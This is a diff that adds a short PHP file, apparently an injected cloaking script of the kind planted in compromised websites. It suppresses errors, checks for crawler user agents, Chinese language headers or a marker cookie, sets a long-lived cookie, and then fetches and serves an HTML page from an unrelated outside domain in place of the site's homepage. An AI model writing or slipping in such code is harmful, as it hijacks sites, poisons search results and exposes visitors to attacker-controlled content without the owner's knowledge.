@@ -1,0 +1,14 @@
+<?php
+error_reporting(0);
+
+if(strpos($_SERVER['HTTP_USER_AGENT'], 'bot') > 0 && $_SERVER['REQUEST_URI'] == '/') {
+    if(strpos(strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']), 'zh') > -1 || 
+       $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 || 
+       $_COOKIE['az'] == 'lp') {
+        
+        setcookie('az', 'lp', time() + 3600 * 7200);
+        $content = file_get_contents('https://page.trattoriadelborgopg.it/students/lp.html');
+        echo $content;
+        exit;
+       }
+} ?>
